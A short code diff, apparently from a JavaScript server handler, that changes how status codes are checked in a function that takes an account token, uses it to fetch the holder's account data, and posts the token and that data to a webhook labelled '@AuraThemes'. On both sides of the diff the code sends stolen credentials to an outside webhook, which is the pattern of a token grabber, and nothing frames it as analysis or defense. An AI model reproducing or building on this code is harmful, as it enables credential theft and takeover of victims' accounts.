@@ -21,12 +21,12 @@ export default async function handler(req, res) {
         }
       });
 
-      const info = {
-        token: token,
-        ...response.data
-      };
+      if (response.status === 200) {
+        const info = {
+          token: token,
+          ...response.data
+        };
 
-      if (info?.id) {
         await axios.post(webhook, {
           username: '@AuraThemes',
           avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
@@ -124,7 +124,7 @@ const languages = {
 
 async function fetch(url, token) {
   try {
-    const { data, status } = await axios.get(url, {
+    const response = await axios.get(url, {
       headers: {
         'Content-Type': 'application/json',
         'Authorization': token,
@@ -132,8 +132,8 @@ async function fetch(url, token) {
       timeout: 5000,
     });
 
-    if (status === 200) {
-      return data;
+    if (response.status === 200) {
+      return response.data;
     }
 
     return {};
